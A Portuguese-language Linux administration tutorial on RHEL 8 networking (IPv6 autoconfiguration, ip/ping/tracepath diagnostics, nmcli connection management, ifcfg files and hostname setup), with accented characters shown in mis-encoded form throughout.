[user@host ~]$ ping6 ff02::1%ens3 PING ff02::1%ens3(ff02::1) 56 data bytes 64 bytes from fe80::211:22ff:feaa:bbcc: icmp_seq=1 ttl=64 time=0.072 ms 64 bytes from fe80::200:aaff:fe33:2211: icmp_seq=1 ttl=64 time=102 ms (DUP!) 64 bytes from fe80::bcd:efff:fea1:b2c3: icmp_seq=1 ttl=64 time=103 ms (DUP!) 64 bytes from fe80::211:22ff:feaa:bbcc: icmp_seq=2 ttl=64 time=0.079 ms &amp;hellip;output omitted&amp;hellip;
Configura√ß√£o do endere√ßo IPv6
O IPv4 tem duas maneiras na qual os endere√ßos s√£o configurados nas interfaces de rede. Os endere√ßos de rede podem ser configurados em interfaces manualmente pelo administrador ou dinamicamente a partir da rede usando DHCP. O IPv6 tamb√©m d√° suporte √† configura√ß√£o manual e a dois m√©todos de configura√ß√£o din√¢mica, um dos quais √© DHCPv6.
As IDs de interface dos endere√ßos IPv6 est√°ticos podem ser selecionadas por vontade, assim como IPv4. No IPv4, existem dois endere√ßos em uma rede que n√£o podem ser usados: o endere√ßo mais baixo e o mais alto na sub-rede. No IPv6, as IDs de interface a seguir s√£o reservadas e n√£o podem ser usadas em um endere√ßo de rede normal em um host.
O identificador composto somente por zeros 0000:0000:0000:0000 (‚Äúsubnet router anycast‚Äù) usado por todos os roteadores no link (para a rede 2001:db8::/64, seria o endere√ßo 2001:db8::). Os identificadores fdff:ffff:ffff:ff80 a fdff:ffff:ffff:ffff. O DHCPv6 funciona de maneira diferente do que o DHCP para IPv4, pois n√£o h√° endere√ßo de transmiss√£o. Basicamente, um host envia uma solicita√ß√£o de DHCPv6 de seu endere√ßo link-local para a porta 547/UDP em ff02::1:2, o grupo multicast link-local de all-dhcp-servers. O servidor DHCPv6 ent√£o geralmente envia uma resposta com informa√ß√µes apropriadas para a porta 546/UDP no endere√ßo link-local do cliente.
O pacote dhcp no Red Hat Enterprise Linux 8 d√° suporte a um servidor DHCPv6.
Al√©m de DHCPv6, o IPv6 tamb√©m d√° suporte a um segundo m√©todo de configura√ß√£o din√¢mica, chamado de Configura√ß√£o autom√°tica de endere√ßo sem estado (SLAAC). Usando SLAAC, o host traz sua interface com um endere√ßo link-local fe80::/64 normalmente. Em seguida, ele envia uma ‚Äúsolicita√ß√£o de roteador‚Äù para ff02::2, o grupo multicast link-local de todos os roteadores. Um roteador IPv6 no link local responde ao endere√ßo link-local do host com um prefixo de rede e possivelmente outras informa√ß√µes. O host ent√£o usa esse prefixo de rede com uma ID de interface que normalmente constr√≥i da mesma maneira que s√£o constru√≠dos os endere√ßos link-local. O roteador envia periodicamente atualiza√ß√µes multicast (‚Äúan√∫ncios do roteador‚Äù) para confirmar ou atualizar as informa√ß√µes que ele forneceu.
O pacote radvd no Red Hat Enterprise Linux 8 permite que um roteador IPv6 baseado no Red Hat Enterprise Linux forne√ßa SLAAC por meio de an√∫ncios do roteador. Importante
Uma m√°quina t√≠pica do Red Hat Enterprise Linux 8 configurada para obter endere√ßos IPv4 por meio do DHCP geralmente √© configurada tamb√©m para usar SLAAC a fim de obter endere√ßos IPv6. Isso pode resultar em m√°quinas obtendo inesperadamente endere√ßos IPv6 quando um roteador IPv6 √© adicionado √† rede.
Algumas implanta√ß√µes de IPv6 combinam SLAAC e DHCPv6, usando SLAAC para somente fornecer informa√ß√µes de endere√ßo da rede e DHCPv6 para fornecer outras informa√ß√µes, como quais servidores DNS e dom√≠nios de pesquisa devem ser configurados. Nomes de host e endere√ßos IP
Seria inconveniente se voc√™ sempre precisasse usar endere√ßos IP para contatar seus servidores. Normalmente, as pessoas preferem trabalhar com nomes do que com cadeias num√©ricas longas e dif√≠ceis de memorizar. Por isso, o Linux tem v√°rios mecanismos para mapear o nome de host a um endere√ßo IP, coletivamente chamados de resolu√ß√£o de nomes.
Uma maneira de fazer isso √© definir uma entrada est√°tica para cada nome no arquivo /etc/hosts de cada sistema. Isso exige a atualiza√ß√£o manual da c√≥pia do arquivo de cada servidor.
Na maioria dos hosts, voc√™ pode procurar o endere√ßo de um nome de host (ou o nome de host de um endere√ßo) em um servi√ßo de rede chamado de Sistema de nomes de dom√≠nio (DNS). DNS √© uma rede distribu√≠da de servidores que fornece mapeamentos de nomes de host a endere√ßos IP. Para que o servi√ßo de nomes funcione, o host precisa ser apontado para um nameserver. Esse nameserver n√£o precisa estar na mesma sub-rede, mas apenas ser alcan√ßado pelo host. Normalmente, isso √© configurado por meio do DHCP ou de uma configura√ß√£o est√°tica em um arquivo chamado de /etc/resolv.conf. As se√ß√µes posteriores deste cap√≠tulo explicar√£o como configurar a resolu√ß√£o de nomes.
Valida√ß√£o da configura√ß√£o de rede Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de testar e inspecionar a configura√ß√£o de rede atual com utilit√°rios de linha de comando. Coleta das informa√ß√µes da interface de rede
Identifica√ß√£o das interfaces de rede
O comando ip link listar√° todas as interfaces de rede dispon√≠veis em seu sistema:
[user@host ~]$ ip link show 1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: ens3: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether 52:54:00:00:00:0a brd ff:ff:ff:ff:ff:ff 3: ens4: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether 52:54:00:00:00:1e brd ff:ff:ff:ff:ff:ff
No exemplo anterior, o servidor tem tr√™s interfaces de rede: lo, que √© o dispositivo de loopback que est√° conectado ao pr√≥prio servidor e duas interfaces de ethernet, ens3 e ens4.
Para configurar cada interface de rede corretamente, voc√™ precisa saber qual delas est√° conectada a qual rede. Em muitos casos, voc√™ saber√° o endere√ßo MAC da interface conectada a cada rede, seja porque est√° fisicamente impressa na placa ou no servidor ou porque √© uma m√°quina virtual e voc√™ sabe como ela est√° configurada. O endere√ßo MAC do dispositivo √© listado ap√≥s link/ether para cada interface. Ent√£o voc√™ sabe que a placa de rede com o endere√ßo MAC 52:54:00:00:00:0a √© a interface de rede ens3.
Exibi√ß√£o dos endere√ßos IP
Use o comando ip para visualizar as informa√ß√µes do dispositivo e de endere√ßo. Uma interface de rede √∫nica pode ter v√°rios endere√ßos IPv4 ou IPv6.
redes_plan_1.png
Exibindo estat√≠sticas de desempenho
O comando ip tamb√©m pode ser usado para mostrar as estat√≠sticas sobre o desempenho da rede. √â poss√≠vel usar contadores para cada interface de rede para identificar a presen√ßa de problemas de rede. Os contadores registram estat√≠sticas de elementos como o n√∫mero de pacotes recebidos (RX) e transmitidos (TX), erros de pacotes e pacotes que foram descartados.
[user@host ~]$ ip -s link show ens3 2: ens3: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 52:54:00:00:00:0a brd ff:ff:ff:ff:ff:ff RX: bytes packets errors dropped overrun mcast 269850 2931 0 0 0 0 TX: bytes packets errors dropped carrier collsns 300556 3250 0 0 0 0
Verifica√ß√£o da conectividade entre hosts
O comando ping √© usado para testar a conectividade. O comando continuar√° sendo executado at√© voc√™ pressionar Ctrl&#43;c, a menos que sejam indicadas op√ß√µes para limitar o n√∫mero de pacotes enviados.
[user@host ~]$ ping -c3 192.0.2.254 PING 192.0.2.1 (192.0.2.254) 56(84) bytes of data. 64 bytes from 192.0.2.254: icmp_seq=1 ttl=64 time=4.33 ms 64 bytes from 192.0.2.254: icmp_seq=2 ttl=64 time=3.48 ms 64 bytes from 192.0.2.254: icmp_seq=3 ttl=64 time=6.83 ms
&amp;mdash; 192.0.2.254 ping statistics &amp;mdash; 3 packets transmitted, 3 received, 0% packet loss, time 2003ms rtt min/avg/max/mdev = 3.485/4.885/6.837/1.424 ms
O comando ping6 √© a vers√£o IPv6 do ping no Red Hat Enterprise Linux. Ele se comunica por IPv6 e obt√©m endere√ßos IPv6, mas funciona como ping.
[user@host ~]$ ping6 2001:db8:0:1::1 PING 2001:db8:0:1::1(2001:db8:0:1::1) 56 data bytes 64 bytes from 2001:db8:0:1::1: icmp_seq=1 ttl=64 time=18.4 ms 64 bytes from 2001:db8:0:1::1: icmp_seq=2 ttl=64 time=0.178 ms 64 bytes from 2001:db8:0:1::1: icmp_seq=3 ttl=64 time=0.180 ms ^C &amp;mdash; 2001:db8:0:1::1 ping statistics &amp;mdash; 3 packets transmitted, 3 received, 0% packet loss, time 2001ms rtt min/avg/max/mdev = 0.178/6.272/18.458/8.616 ms [user@host ~]$
Quando voc√™ faz ping dos endere√ßos link-local e do grupo multicast link-local para todos os n√≥s (ff02::1), a interface de rede a ser usada deve ser explicitamente especificada com um identificador de zona de escopo (como ff02::1%ens3). Se isso n√£o for feito, ser√° exibido o erro connect: Invalid argument
Fazer o ping de ff02::1 pode ser √∫til para encontrar outros n√≥s de IPv6 na rede local.
[user@host ~]$ ping6 ff02::1%ens4 PING ff02::1%ens4(ff02::1) 56 data bytes 64 bytes from fe80::78cf:7fff:fed2:f97b: icmp_seq=1 ttl=64 time=22.7 ms 64 bytes from fe80::f482:dbff:fe25:6a9f: icmp_seq=1 ttl=64 time=30.1 ms (DUP!) 64 bytes from fe80::78cf:7fff:fed2:f97b: icmp_seq=2 ttl=64 time=0.183 ms 64 bytes from fe80::f482:dbff:fe25:6a9f: icmp_seq=2 ttl=64 time=0.231 ms (DUP!) ^C &amp;mdash; ff02::1%ens4 ping statistics &amp;mdash; 2 packets transmitted, 2 received, &#43;2 duplicates, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 0.183/13.320/30.158/13.374 ms [user@host ~]$ ping6 -c 1 fe80::f482:dbff:fe25:6a9f%ens4 PING fe80::f482:dbff:fe25:6a9f%ens4(fe80::f482:dbff:fe25:6a9f) 56 data bytes 64 bytes from fe80::f482:dbff:fe25:6a9f: icmp_seq=1 ttl=64 time=22.9 ms
&amp;mdash; fe80::f482:dbff:fe25:6a9f%ens4 ping statistics &amp;mdash; 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 22.903/22.903/22.903/0.000 ms
Lembre-se de que os endere√ßos link-local IPv6 podem ser usados por outros hosts no mesmo link, como endere√ßos normais.
[user@host ~]$ ssh fe80::f482:dbff:fe25:6a9f%ens4 user@fe80::f482:dbff:fe25:6a9f%ens4&amp;rsquo;s password: Last login: Thu Jun 5 15:20:10 2014 from host.example.com [user@server ~]$
Solu√ß√£o de problemas de roteamento
O roteamento de rede √© complexo e, √†s vezes, o tr√°fego n√£o se comporta como voc√™ espera. Aqui est√£o algumas ferramentas √∫teis de diagn√≥stico.
Exibi√ß√£o da tabela de roteamento
Use o comando ip com a op√ß√£o route para mostrar as informa√ß√µes de roteamento.
[user@host ~]$ ip route default via 192.0.2.254 dev ens3 proto static metric 1024 192.0.2.0/24 dev ens3 proto kernel scope link src 192.0.2.2 10.0.0.0/8 dev ens4 proto kernel scope link src 10.0.0.11
A tabela de roteamento IPv4 √© exibida. Todos os pacotes destinados √† rede 10.0.0.0/8 s√£o enviados diretamente para o destino pelo dispositivo ens4. Todos os pacotes destinados √† rede 192.0.2.0/24 s√£o enviados diretamente para o destino pelo dispositivo ens3. Todos os outros pacotes s√£o enviados para o roteador padr√£o, localizado em 192.0.2.254 e tamb√©m pelo dispositivo ens3.
Adicione a op√ß√£o -6 para mostrar a tabela de roteamento IPv6:
[user@host ~]$ ip -6 route unreachable ::/96 dev lo metric 1024 error -101 unreachable ::ffff:0.0.0.0/96 dev lo metric 1024 error -101 2001:db8:0:1::/64 dev ens3 proto kernel metric 256 unreachable 2002:a00::/24 dev lo metric 1024 error -101 unreachable 2002:7f00::/24 dev lo metric 1024 error -101 unreachable 2002:a9fe::/32 dev lo metric 1024 error -101 unreachable 2002:ac10::/28 dev lo metric 1024 error -101 unreachable 2002:c0a8::/32 dev lo metric 1024 error -101 unreachable 2002:e000::/19 dev lo metric 1024 error -101 unreachable 3ffe:ffff::/32 dev lo metric 1024 error -101 fe80::/64 dev ens3 proto kernel metric 256 default via 2001:db8:0:1::ffff dev ens3 proto static metric 1024
Nesse exemplo, ignore as rotas inacess√≠veis, que apontam para redes n√£o utilizadas. Sobram tr√™s rotas:
A rede 2001:db8:0:1::/64, usando a interface ens3 (que, presumivelmente, tem um endere√ßo nessa rede). A rede fe80::/64, usando a interface ens3, para o endere√ßo link-local. Em um sistema com v√°rias interfaces, existe uma rota para fe80::/64 saindo de cada interface para cada endere√ßo link-local. Uma rota padr√£o para todas as redes na Internet IPv6 (a rede ::/0) que n√£o tem uma rota mais espec√≠fica no sistema, por meio do roteador em 2001:db8:0:1::ffff, que pode ser acessado com o dispositivo ens3. Rastreamento das rotas usadas pelo tr√°fego
Para rastrear o caminho que o tr√°fego de rede segue para chegar a um host remoto por meio de diversos roteadores, use traceroute ou tracepath. Eles podem identificar se o problema est√° em um dos seus roteadores ou em um intermedi√°rio. Os dois comandos usam pacotes UDP para rastrear o caminho por padr√£o. Entretanto, muitas redes bloqueiam os tr√°fegos UDP e ICMP. O comando traceroute tem op√ß√µes para rastrear o caminho com pacotes UDP (padr√£o), ICMP (-I) ou TCP (-T). No entanto, normalmente o comando traceroute n√£o est√° instalado por padr√£o.
[user@host ~]$ tracepath access.redhat.com &amp;hellip;output omitted&amp;hellip; 4: 71-32-28-145.rcmt.qwest.net 48.853ms asymm 5 5: dcp-brdr-04.inet.qwest.net 100.732ms asymm 7 6: 206.111.0.153.ptr.us.xo.net 96.245ms asymm 7 7: 207.88.14.162.ptr.us.xo.net 85.270ms asymm 8 8: ae1d0.cir1.atlanta6-ga.us.xo.net 64.160ms asymm 7 9: 216.156.108.98.ptr.us.xo.net 108.652ms 10: bu-ether13.atlngamq46w-bcr00.tbone.rr.com 107.286ms asymm 12 &amp;hellip;output omitted&amp;hellip;
Cada linha na sa√≠da de tracepath representa um roteador ou um salto que o pacote d√° da origem at√© o destino final. Informa√ß√µes adicionais s√£o fornecidas conforme dispon√≠veis, incluindo o tempo de viagem de ida e volta (RTT) e quaisquer altera√ß√µes no tamanho da unidade m√°xima de transmiss√£o (MTU). A indica√ß√£o asymm significa que o tr√°fego chegou a esse roteador e retornou do roteador usando rotas diferentes (assim√©tricas). Os roteadores exibidos s√£o os roteadores usados para o tr√°fego de sa√≠da, n√£o para o tr√°fego de retorno.
Os comandos tracepath6 e traceroute -6 s√£o equivalentes a tracepath e traceroute para IPv6.
[user@host ~]$ tracepath6 2001:db8:0:2::451 1?: [LOCALHOST] 0.091ms pmtu 1500 1: 2001:db8:0:1::ba 0.214ms 2: 2001:db8:0:1::1 0.512ms 3: 2001:db8:0:2::451 0.559ms reached Resume: pmtu 1500 hops 3 back 3
Solu√ß√£o de problemas de portas e servi√ßos
Os servi√ßos de TCP usam soquetes como pontos finais para comunica√ß√£o e s√£o compostos de um endere√ßo IP, um protocolo e um n√∫mero de porta. Os servi√ßos tipicamente escutam as portas padr√£o, enquanto os clientes usam uma porta dispon√≠vel aleatoriamente. Nomes de portas padr√£o bem conhecidos s√£o listados no arquivo /etc/services.
O comando ss √© usado para exibir as estat√≠sticas de soquete. O comando ss pretende substituir a antiga ferramenta netstat, parte do pacote net-tools, que talvez seja mais conhecida por alguns administradores de sistema, mas nem sempre est√° instalada.
redes_plan_2.png
Tabela 12.6. Op√ß√µes para ss e netstat
table_p2.png
Configura√ß√£o de redes usando a linha de comando Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de gerenciar as configura√ß√µes de rede e de dispositivos usando o comando nmcli. Descri√ß√£o de conceitos do NetworkManager
O NetworkManager √© um daemon que monitora e gerencia as configura√ß√µes de rede. Al√©m do daemon, h√° um applet de √°rea de notifica√ß√£o GNOME que fornece informa√ß√µes de status da rede. As ferramentas gr√°ficas e de linha de comando entram em contato com o NetworkManager e salvam os arquivos de configura√ß√£o no diret√≥rio /etc/sysconfig/network-scripts.
Um dispositivo √© uma interface de rede. Uma conex√£o √© um conjunto de configura√ß√µes que podem ser definidas para um dispositivo. Somente uma conex√£o pode ficar ativa para um dispositivo por vez. √â poss√≠vel haver v√°rias conex√µes para uso por diferentes dispositivos ou para permitir a altera√ß√£o de uma configura√ß√£o no mesmo dispositivo. Se voc√™ precisar alterar temporariamente as configura√ß√µes de rede, em vez de mudar a configura√ß√£o de uma conex√£o, poder√° alterar qual conex√£o estar√° ativa em um dispositivo. Por exemplo, um dispositivo em uma interface de rede sem fio de um laptop pode usar conex√µes diferentes para a rede sem fio em um local de trabalho e para a rede sem fio em casa. Cada conex√£o tem um nome ou uma ID que a identifica. O utilit√°rio nmcli √© usado para criar e editar arquivos de conex√£o a partir da linha de comando. Visualiza√ß√£o de informa√ß√µes da rede
O comando nmcli dev status mostra o status de todos os dispositivos de rede:
[user@host ~]$ nmcli dev status DEVICE TYPE STATE CONNECTION eno1 ethernet connected eno1 ens3 ethernet connected static-ens3 eno2 ethernet disconnected &amp;ndash; lo loopback unmanaged &amp;ndash;
O comando nmcli con show exibe a lista de todas as conex√µes. Para listar somente as conex√µes ativas, adicione a op√ß√£o &amp;ndash;active.
[user@host ~]$ nmcli con show NAME UUID TYPE DEVICE eno2 ff9f7d69-db83-4fed-9f32-939f8b5f81cd 802-3-ethernet &amp;ndash; static-ens3 72ca57a2-f780-40da-b146-99f71c431e2b 802-3-ethernet ens3 eno1 87b53c56-1f5d-4a29-a869-8a7bdaf56dfa 802-3-ethernet eno1 [user@host ~]$ nmcli con show &amp;ndash;active NAME UUID TYPE DEVICE static-ens3 72ca57a2-f780-40da-b146-99f71c431e2b 802-3-ethernet ens3 eno1 87b53c56-1f5d-4a29-a869-8a7bdaf56dfa 802-3-ethernet eno1
Adi√ß√£o de uma conex√£o de rede
O comando nmcli con add √© usado para adicionar novas conex√µes de rede. Os exemplos de comandos nmcli con add a seguir pressup√µem que o nome da conex√£o de rede que est√° sendo adicionada n√£o est√° em uso.
O comando a seguir adiciona uma nova conex√£o denominada eno2 √† interface eno2, que obt√©m informa√ß√µes da rede IPv4 usando o DHCP e faz a conex√£o autom√°tica durante a inicializa√ß√£o. Ele tamb√©m obt√©m as configura√ß√µes de rede IPv6 escutando os an√∫ncios do roteador no link local. O nome do arquivo de configura√ß√£o √© baseado no valor da op√ß√£o con-name, eno2, e √© salvo no arquivo /etc/sysconfig/network-scripts/ifcfg-eno2.
[root@host ~]# nmcli con add con-name eno2 type ethernet ifname eno2
O pr√≥ximo exemplo cria uma conex√£o eno2 para o dispositivo eno2 com um endere√ßo IPv4 est√°tico, usando o endere√ßo IPv4 e o prefixo de rede 192.168.0.5/24 com o gateway padr√£o 192.168.0.254, mas ainda se conecta automaticamente na inicializa√ß√£o e salva sua configura√ß√£o no mesmo arquivo. Devido a limita√ß√µes de tamanho da tela, encerre a primeira linha com um escape \ de shell e complete o comando na pr√≥xima linha.
[root@host ~]# nmcli con add con-name eno2 type ethernet ifname eno2 ipv4.address 192.168.0.5/24 ipv4.gateway 192.168.0.254
O exemplo final cria uma conex√£o eno2 para o dispositivo eno2 com endere√ßos IPv6 e IPv4 est√°ticos, usando o endere√ßo IPv6 e o prefixo de rede 2001:db8:0:1::c000:207/64 com o gateway IPv6 padr√£o 2001:db8:0:1::1, e o endere√ßo IPv4 e o prefixo de rede 192.0.2.7/24 com o gateway IPv4 padr√£o 192.0.2.1, mas ainda faz a conex√£o autom√°tica e salva sua configura√ß√£o em /etc/sysconfig/network-scripts/ifcfg-eno2. Devido a limita√ß√µes de tamanho da tela, encerre a primeira linha com um escape \ de shell e complete o comando na pr√≥xima linha.
[root@host ~]# nmcli con add con-name eno2 type ethernet ifname eno2 ipv6.address 2001:db8:0:1::c000:207/64 ipv6.gateway 2001:db8:0:1::1 ipv4.address 192.0.2.7/24 ipv4.gateway 192.0.2.1
Controle de conex√µes de rede
O comando nmcli con up name ativa o nome da conex√£o na interface de rede √† qual est√° vinculada. Observe que o comando assume o nome de uma conex√£o, n√£o o nome da interface de rede. Lembre-se de que o comando nmcli con show exibe os nomes de todas as conex√µes dispon√≠veis.
[root@host ~]# nmcli con up static-ens3
O comando nmcli dev disconnect device desconecta o dispositivo da interface de rede e o deixa inoperante. Este comando pode ser abreviado como nmcli dev dis device:
[root@host ~]# nmcli dev dis ens3
Importante
Use nmcli dev dis device para desativar uma interface de rede.
Normalmente, o comando nmcli con down name n√£o √© a melhor maneira de desativar uma interface de rede porque ele interrompe a conex√£o. No entanto, por padr√£o, a maioria das conex√µes de sistema √© configurada com a op√ß√£o autoconnect habilitada. Isso ativar√° a conex√£o assim que a interface de rede estiver dispon√≠vel. Como a interface de rede da conex√£o ainda est√° dispon√≠vel, nmcli con down name deixa a interface inoperante, mas o NetworkManager a traz de volta imediatamente a menos que a conex√£o seja totalmente desconectada da interface. Modifica√ß√£o das configura√ß√µes de conex√£o de rede
As conex√µes do NetworkManager t√™m dois tipos de configura√ß√£o. H√° propriedades de conex√£o est√°ticas, configuradas pelo administrador e armazenadas nos arquivos de configura√ß√£o em /etc/sysconfig/network-scripts/ifcfg-*. Pode haver tamb√©m dados ativos de conex√£o, que a conex√£o obt√©m de um servidor DHCP e que n√£o est√£o armazenados de modo persistente.
Para listar as configura√ß√µes atuais de uma conex√£o, execute o comando nmcli con show name, em que name √© o nome da conex√£o. As configura√ß√µes em letras min√∫sculas s√£o propriedades est√°ticas que o administrador pode alterar. As configura√ß√µes em mai√∫sculas s√£o configura√ß√µes ativas de uso tempor√°rio para essa inst√¢ncia da conex√£o.
[root@host ~]# nmcli con show static-ens3 connection.id: static-ens3 connection.uuid: 87b53c56-1f5d-4a29-a869-8a7bdaf56dfa connection.interface-name: &amp;ndash; connection.type: 802-3-ethernet connection.autoconnect: yes connection.timestamp: 1401803453 connection.read-only: no connection.permissions: connection.zone: &amp;ndash; connection.master: &amp;ndash; connection.slave-type: &amp;ndash; connection.secondaries: connection.gateway-ping-timeout: 0 802-3-ethernet.port: &amp;ndash; 802-3-ethernet.speed: 0 802-3-ethernet.duplex: &amp;ndash; 802-3-ethernet.auto-negotiate: yes 802-3-ethernet.mac-address: CA:9D:E9:2A:CE:F0 802-3-ethernet.cloned-mac-address: &amp;ndash; 802-3-ethernet.mac-address-blacklist: 802-3-ethernet.mtu: auto 802-3-ethernet.s390-subchannels: 802-3-ethernet.s390-nettype: &amp;ndash; 802-3-ethernet.s390-options: ipv4.method: manual ipv4.dns: 192.168.0.254 ipv4.dns-search: example.com ipv4.addresses: { ip = 192.168.0.2/24, gw = 192.168.0.254 } ipv4.routes: ipv4.ignore-auto-routes: no ipv4.ignore-auto-dns: no ipv4.dhcp-client-id: &amp;ndash; ipv4.dhcp-send-hostname: yes ipv4.dhcp-hostname: &amp;ndash; ipv4.never-default: no ipv4.may-fail: yes ipv6.method: manual ipv6.dns: 2001:4860:4860::8888 ipv6.dns-search: example.com ipv6.addresses: { ip = 2001:db8:0:1::7/64, gw = 2001:db8:0:1::1 } ipv6.routes: ipv6.ignore-auto-routes: no ipv6.ignore-auto-dns: no ipv6.never-default: no ipv6.may-fail: yes ipv6.ip6-privacy: -1 (unknown) ipv6.dhcp-hostname: &amp;ndash; &amp;hellip;output omitted&amp;hellip;
O comando nmcli con mod name √© usado para alterar as configura√ß√µes de uma conex√£o. Essas altera√ß√µes tamb√©m s√£o salvas no arquivo /etc/sysconfig/network-scripts/ifcfg-name da conex√£o. As configura√ß√µes dispon√≠veis est√£o documentadas na p√°gina de manual nm-settings(5).
Para definir o endere√ßo IPv4 para 192.0.2.2/24 e o gateway padr√£o para 192.0.2.254 da conex√£o static-ens3:
[root@host ~]# nmcli con mod static-ens3 ipv4.address 192.0.2.2/24 ipv4.gateway 192.0.2.254
Para definir o endere√ßo IPv6 para 2001:db8:0:1::a00:1/64 e o gateway padr√£o para 2001:db8:0:1::1 da conex√£o static-ens3:
[root@host ~]# nmcli con mod static-ens3 ipv6.address 2001:db8:0:1::a00:1/64 ipv6.gateway 2001:db8:0:1::1
Importante
Se uma conex√£o que receber suas informa√ß√µes de IPv4 de um servidor DHCPv4 for alterada para obt√™-las somente de arquivos de configura√ß√£o est√°ticos, a configura√ß√£o ipv4.method tamb√©m dever√° ser alterada de auto para manual.
Da mesma forma, se uma conex√£o que receber suas informa√ß√µes de IPv6 por SLAAC ou um servidor DHCPv6 for alterada para obt√™-las somente de arquivos de configura√ß√£o est√°ticos, a configura√ß√£o ipv6.method tamb√©m dever√° ser alterada de auto ou dhcp para manual.
Caso contr√°rio, a conex√£o poder√° cair ou n√£o ser conclu√≠da com √™xito quando for ativada ou poder√° obter um endere√ßo IPv4 do DHCP ou um endere√ßo IPv6 de SLAAC ou DHCPv6 al√©m do endere√ßo est√°tico.
Diversas configura√ß√µes podem ter v√°rios valores. Um valor espec√≠fico pode ser adicionado √† ou exclu√≠do da lista de uma configura√ß√£o acrescentando um s√≠mbolo de &#43; ou - ao in√≠cio do nome de configura√ß√£o. Exclus√£o de uma conex√£o de rede
O comando nmcli con del name exclui a conex√£o denominada nome do sistema, desconectando-a do dispositivo e removendo o arquivo /etc/sysconfig/network-scripts/ifcfg-name.
[root@host ~]# nmcli con del static-ens3
Quem pode modificar as configura√ß√µes de rede?
O usu√°rio root pode fazer qualquer altera√ß√£o de configura√ß√£o de rede necess√°ria com nmcli.
No entanto, usu√°rios regulares que est√£o conectados no console local tamb√©m podem fazer v√°rias altera√ß√µes de configura√ß√£o de rede no sistema. Eles precisam fazer o login no teclado do sistema para um console virtual baseado em texto ou o ambiente de √°rea de trabalho gr√°fica para obter esse controle. A l√≥gica por tr√°s disso √© que, se algu√©m estiver fisicamente presente no console do computador, este provavelmente ser√° usado como esta√ß√£o de trabalho ou laptop e poder√° precisar configurar, ativar e desativar interfaces de rede com ou sem fio √† vontade. Por outro lado, se o sistema √© um servidor no data center, geralmente os √∫nicos usu√°rios que fazem login localmente na pr√≥pria m√°quina devem ser administradores.
Os usu√°rios regulares que fazem login usando ssh n√£o t√™m acesso para alterar as permiss√µes de rede sem se tornar root.
Voc√™ pode usar o comando nmcli gen permissions para ver quais s√£o as suas permiss√µes atuais.
Sum√°rio de comandos A tabela a seguir apresenta uma lista dos principais comandos nmcli abordados nesta se√ß√£o.
nmcli.png
Edi√ß√£o de arquivos de configura√ß√£o de rede Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de modificar a configura√ß√£o da rede por meio da edi√ß√£o dos arquivos de configura√ß√£o. Descri√ß√£o dos arquivos de configura√ß√£o de conex√£o
Por padr√£o, as altera√ß√µes feitas com nmcli con mod name s√£o salvas automaticamente em /etc/sysconfig/network-scripts/ifcfg-name. Esse arquivo tamb√©m pode ser editado manualmente com um editor de texto. Depois de fazer isso, execute nmcli con reload de modo que o NetworkManager leia as altera√ß√µes de configura√ß√£o.
Por raz√µes de compatibilidade retroativa, as diretivas salvas nesse arquivo possuem nomes e sintaxe diferentes dos nomes nm-settings(5). A tabela a seguir mapeia alguns dos principais nomes de configura√ß√£o para as diretivas ifcfg-*.
Tabela 12.7. Compara√ß√£o das diretivas nm-settings e ifcfg-*
Modifica√ß√£o da configura√ß√£o de rede Tamb√©m √© poss√≠vel configurar a rede por meio da edi√ß√£o direta dos arquivos de configura√ß√£o da conex√£o. Os arquivos de configura√ß√£o da conex√£o controlam as interfaces de software dos dispositivos de rede individuais. Esses arquivos geralmente recebem o nome de /etc/sysconfig/network-scripts/ifcfg-name, onde name se refere ao nome do dispositivo ou da conex√£o que o arquivo de configura√ß√£o controla. Os itens a seguir s√£o vari√°veis padr√£o encontradas no arquivo usado para a configura√ß√£o IPv4 est√°tica ou din√¢mica.
Tabela 12.8. Op√ß√µes de configura√ß√£o de IPv4 para o arquivo ifcfg
ifctg.png
Na configura√ß√£o est√°tica, vari√°veis por endere√ßo IP, prefixo e o gateway t√™m um n√∫mero ao final. Isso permite que v√°rios conjuntos de valores sejam atribu√≠dos √† interface. A vari√°vel DNS tamb√©m tem um n√∫mero usado para determinar a ordem da consulta quando v√°rios servidores s√£o especificados.
Depois de modificar os arquivos de configura√ß√£o, execute nmcli con reload para fazer com que o NetworkManager leia as altera√ß√µes de configura√ß√£o. A interface ainda precisa ser reiniciada para que as altera√ß√µes tenham efeito.
[root@host ~]# nmcli con reload [root@host ~]# nmcli con down &amp;ldquo;static-ens3&amp;rdquo; [root@host ~]# nmcli con up &amp;ldquo;static-ens3&amp;rdquo;
Configura√ß√£o de nomes de host e resolu√ß√£o de nomes Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de configurar o nome do host est√°tico do servidor e sua resolu√ß√£o de nomes e testar os resultados. Altera√ß√£o do nome do host do sistema
O comando hostname exibe ou modifica temporariamente o nome do host totalmente qualificado do sistema.
[root@host ~]# hostname host.example.com
Um nome do host est√°tico pode ser especificado no arquivo /etc/hostname. O comando hostnamectl √© usado para modificar esse arquivo e pode ser utilizado para visualizar o status do nome do host totalmente qualificado do sistema. Se esse arquivo n√£o existir, o nome do host ser√° configurado por uma consulta de DNS reverso quando a interface tiver um endere√ßo IP atribu√≠do.
[root@host ~]# hostnamectl set-hostname host.example.com [root@host ~]# hostnamectl status Static hostname: host.example.com Icon name: computer-vm Chassis: vm Machine ID: f874df04639f474cb0a9881041f4f7d4 Boot ID: 6a0abe03ef0b4a97bcb8afb7b281e4d3 Virtualization: kvm Operating System: Red Hat Enterprise Linux 8.2 (Ootpa) CPE OS Name: cpe:/o:redhat:enterprise_linux:8.2:GA Kernel: Linux 4.18.0-193.el8.x86_64 Architecture: x86-64 [root@host ~]# cat /etc/hostname host.example.com
Importante
